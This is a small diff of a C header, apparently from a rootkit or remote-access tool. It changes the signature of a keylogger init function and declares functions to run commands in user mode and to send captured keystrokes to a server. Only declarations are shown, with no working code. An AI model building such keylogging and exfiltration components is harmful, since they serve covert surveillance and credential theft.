@@ -39,7 +39,7 @@ struct command {
 int exec_str_as_command_with_timeout(char *user_cmd, bool catch_stds, int timeout);	                                            // Execute a command string in user mode
 
 // epikeylog.c
-int epikeylog_init(int keylog_mode);						// Initialize the keylogger
+int epikeylog_init(void);               					// Initialize the keylogger
 int epikeylog_send_to_server(void);							// Send keylogger content to the server
 int epikeylog_exit(void);									// Cleanup function for the keylogger
 
